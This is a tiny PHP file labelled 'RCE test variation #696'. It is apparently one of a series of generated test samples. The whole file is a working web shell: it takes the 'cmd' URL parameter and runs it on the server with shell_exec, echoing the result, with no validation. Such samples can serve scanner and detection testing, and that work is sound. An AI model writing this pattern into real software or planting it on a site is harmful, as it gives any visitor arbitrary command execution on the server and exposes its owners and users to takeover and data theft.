<?php
// RCE test variation #696
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>